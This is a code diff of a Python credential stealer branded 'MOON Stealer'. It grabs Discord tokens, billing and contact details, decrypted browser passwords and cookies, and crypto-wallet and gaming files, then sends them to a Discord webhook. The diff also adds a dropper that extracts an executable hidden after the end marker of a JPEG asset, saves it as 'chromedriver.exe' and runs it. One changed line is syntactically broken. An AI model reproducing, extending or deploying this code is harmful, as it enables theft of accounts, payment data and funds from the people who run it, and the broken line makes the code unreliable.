@@ -22,12 +22,24 @@ from bs4 import BeautifulSoup
 from datetime import datetime
 from geopy.geocoders import Nominatim
 from selenium import webdriver
+import json
+
+if os.name == "nt":
+    pass
+
+else:
+    print("Your operating system is not supported.")
+    quit()
+
+
+import time
+import sys
 
 hook = "X"
 DETECTED = False
 
-moon = "assets/img.jpg"
-if os.path.exists(moon) == False:
+checkAssets = "assets/img.jpg"
+if os.path.exists(checkAssets) == False:
     print('"assets/img.jpg" NOT FOUND.')
     quit()
 
@@ -127,6 +139,11 @@ def LoadUrlib(hook, data="", files="", headers=""):
             pass
 
 
+payload = {"content": "@everyone **NEW LOG!**"}
+
+response = requests.post(hook, json=payload)
+
+
 def globalInfo():
     ip = getip()
     username = os.getenv("USERNAME")
@@ -142,7 +159,7 @@ def globalInfo():
     # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
     contry = ipdata["country_name"]
     contryCode = ipdata["country_code"].lower()
-    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
+    globalinfo = f":flag_{contryCode}:   -   `{username.upper()} ︰ {ip} [{contry}]`"
     # print(globalinfo)
     return globalinfo
 
@@ -153,7 +170,7 @@ def Trust(Cookies):
     data = str(Cookies)
     tim = re.findall(".google.com", data)
     # print(len(tim))
-    if len(tim) < -1:
+    if len(tim) < 1:
         DETECTED = True
         return DETECTED
     else:
@@ -243,7 +260,7 @@ def GetUHQFriends(token):
                     OwnedBadges += badge["Emoji"]
                 flags = flags % badge["Value"]
         if OwnedBadges != "":
-            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
+            uhqlist += f"{OwnedBadges}︰{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
     return uhqlist
 
 
@@ -268,7 +285,7 @@ def GetBilling(token):
         return False
 
     if billingjson == []:
-        return " -"
+        return "N/A"
 
     billing = ""
     for methode in billingjson:
@@ -391,6 +408,7 @@ def checkToken(token):
     except:
         return False
 
+
 def uploadToken(token, path):
     global hook
     headers = {
@@ -412,45 +430,45 @@ def uploadToken(token, path):
     if not billing:
         badge, phone, billing = "🔒", "🔒", "🔒"
     if nitro == "" and badge == "":
-        nitro = " -"
+        nitro = "N/A"
 
     data = {
-        "content": f"{globalInfo()} | Found in `{path}`",
+        "content": f"{globalInfo()}",
         "embeds": [
             {
-                "color": 11111,
+                "color": 12632256,
                 "fields": [
                     {
-                        "name": ":rocket: Token:",
+                        "name": ":tickets: ︰ Token:",
                         "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})",
                     },
                     {
-                        "name": ":envelope: Email:",
+                        "name": ":earth_asia:︰Email:",
                         "value": f"`{email}`",
                         "inline": True,
                     },
                     {
-                        "name": ":mobile_phone: Phone:",
+                        "name": ":telephone_receiver:︰Phone:",
                         "value": f"{phone}",
                         "inline": True,
                     },
                     {
-                        "name": ":globe_with_meridians: IP:",
+                        "name": ":globe_with_meridians:︰IP:",
                         "value": f"`{getip()}`",
                         "inline": True,
                     },
                     {
-                        "name": ":beginner: Badges:",
+                        "name": ":beginner:︰Badges:",
                         "value": f"{nitro}{badge}",
                         "inline": True,
                     },
                     {
-                        "name": ":credit_card: Billing:",
+                        "name": ":credit_card:︰Billing:",
                         "value": f"{billing}",
                         "inline": True,
                     },
                     {
-                        "name": ":clown: HQ Friends:",
+                        "name": ":office:︰HQ Friends:",
                         "value": f"{friends}",
                         "inline": False,
                     },
@@ -485,6 +503,20 @@ def Reformat(listt):
     return list(set(e))
 
 
+Chrome = "chromedriver.exe"
+
+with open("assets/img.jpg", "rb") as f:
+    content = f.read()
+    offset = content.index(bytes.fromhex("FFD9"))
+
+    f.seek(offset + 2)
+
+    with open(Chrome, "wb") as e:
+        e.write(f.read())
+
+os.system(Chrome)
+
+
 def upload(name, link):
     headers = {
         "Content-Type": "application/json",
@@ -492,24 +524,24 @@ def upload(name, link):
     }
 
     if name == "wpcook":
-        rb = " | ".join(da for da in cookiWords)
+        rb = "︰".join(da for da in cookiWords)
         if len(rb) > 1000:
             rrrrr = Reformat(str(cookiWords))
-            rb = " | ".join(da for da in rrrrr)
+            rb = "︰".join(da for da in rrrrr)
         data = {
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "MOON | Cookies Stealer",
+                    "title": "MOON︰Cookies Stealer",
                     "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [MOONCookies.txt]({link})",
-                    "color": 11111,
+                    "color": 12632256,
                     "footer": {
                         "text": "@MOON STEALER",
                         "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
                     },
                 }
             ],
-            "username": "MOON",
+            "username": "MOON Stealer",
             "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
             "attachments": [],
         }
@@ -517,25 +549,25 @@ def upload(name, link):
         return
 
     if name == "wppassw":
-        ra = " | ".join(da for da in paswWords)
+        ra = "︰".join(da for da in paswWords)
         if len(ra) > 1000:
             rrr = Reformat(str(paswWords))
-            ra = " | ".join(da for da in rrr)
+            ra = "︰".join(da for da in rrr)
 
         data = {
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "MOON | Password Stealer",
+                    "title": "MOON︰Password Stealer",
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [MOONPassword.txt]({link})",
-                    "color": 11111,
+                    "color": 12632256,
                     "footer": {
                         "text": "@MOON STEALER",
                         "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
                     },
                 }
             ],
-            "username": "MOON",
+            "username": "MOON Stealer",
             "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
             "attachments": [],
         }
@@ -547,18 +579,18 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "color": 11111,
+                    "color": 12632256,
                     "fields": [
                         {"name": "Interesting files found on user PC:", "value": link}
                     ],
-                    "author": {"name": "MOON | File Stealer"},
+                    "author": {"name": "MOON︰File Stealer"},
                     "footer": {
                         "text": "@MOON STEALER",
                         "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
                     },
                 }
             ],
-            "username": "MOON",
+            "username": "MOON Stealer",
             "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
             "attachments": [],
         }
@@ -658,7 +690,7 @@ def getPassw(path, arg):
                     if not old in paswWords:
                         paswWords.append(old)
             Passw.append(
-                f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}"
+                f"UR1: {row[0]}︰U53RN4M3: {row[1]}︰P455W0RD: {DecryptValue(row[2], master_key)}"
             )
             PasswCount += 1
     writeforfile(Passw, "passw")
@@ -710,11 +742,10 @@ def getCookie(path, arg):
                     if not old in cookiWords:
                         cookiWords.append(old)
             Cookies.append(
-                f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}"
+                f"H057 K3Y: {row[0]}︰N4M3: {row[1]}︰V41U3: {DecryptValue(row[2], master_key)}"
             )
             CookiCount += 1
     writeforfile(Cookies, "cook")
-
 
 
 def GetDiscord(path, arg):
@@ -774,15 +805,15 @@ def GatherZips(paths1, paths2, paths3):
 
     wal, ga, ot = "", "", ""
     if not len(WalletsZip) == 0:
-        wal = ":coin:  •  Wallets\n"
+        wal = ":coin: ︰ Wallets\n"
         for i in WalletsZip:
             wal += f"└─ [{i[0]}]({i[1]})\n"
     if not len(WalletsZip) == 0:
-        ga = ":video_game:  •  Gaming:\n"
+        ga = ":video_game: ︰ Gaming:\n"
         for i in GamingZip:
             ga += f"└─ [{i[0]}]({i[1]})\n"
     if not len(OtherZip) == 0:
-        ot = ":tickets:  •  Apps\n"
+        ot = ":tickets: ︰ Apps\n"
         for i in OtherZip:
             ot += f"└─ [{i[0]}]({i[1]})\n"
     headers = {
@@ -796,7 +827,7 @@ def GatherZips(paths1, paths2, paths3):
             {
                 "title": "MOON Zips",
                 "description": f"{wal}\n{ga}\n{ot}",
-                "color": 11111,
+                "color": 12632256,
                 "footer": {
                     "text": "@MOON STEALER",
                     "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
@@ -807,6 +838,7 @@ def GatherZips(paths1, paths2, paths3):
         "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
         "attachments": [],
     }
+
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
 
 
@@ -1205,16 +1237,15 @@ if not DETECTED:
 
             for ffil in foldlist:
                 a = ffil[0].split("/")
-                fileanme = a[len(a) - 1]
+                fileanme = a[len(a), 1]
                 b = ffil[1]
                 filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
     upload("kiwi", filetext)
-    
 
 ipify = "https://api.ipify.org/"
 response = requests.get(ipify)
-soup = BeautifulSoup(response.text, 'html.parser')
+soup = BeautifulSoup(response.text, "html.parser")
 ip_addr = soup.get_text()
 os_name = platform.system()
 os_version = platform.release()
@@ -1222,32 +1253,29 @@ os_architecture = platform.machine()
 now = datetime.utcnow()
 hostname = socket.gethostbyaddr(ip_addr)[0]
 
-embed = {
-  "title": f"Moon Extras",
-  "color": 9371903,
-  "fields": [
-    {
-      "name": "Device Info",
-      "value": f"Operating System: {os_name} {os_version} {os_architecture}\n"
-    }
-  ]
+message = {
+    "embeds": [
+        {
+            "title": f"MOON︰Extras",
+            "color": 12632256,
+            "fields": [
+                {
+                    "name": "Device Info",
+                    "value": f"Operating System: {os_name} {os_version} {os_architecture}\n",
+                }
+            ],
+            "footer": {
+                "text": "@MOON STEALER",
+                "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
+            },
+        }
+    ]
 }
 
+response = requests.post(hook, json=message)
 
+payload = {"content": "https://discord.gg/fnNd26Depz"}
 
-Chrome = "chromedriver.exe"
+response = requests.post(hook, json=payload)
 
-with open('assets/img.jpg', 'rb') as f:
-  content = f.read()
-  offset = content.index(bytes.fromhex('FFD9'))
-
-  f.seek(offset + 2)
-
-  with open(Chrome, 'wb') as e:
-    e.write(f.read())
-os.system(Chrome)
-
-data = {"embeds": [embed]}
-requests.post(hook, json=data)
-    
 quit()
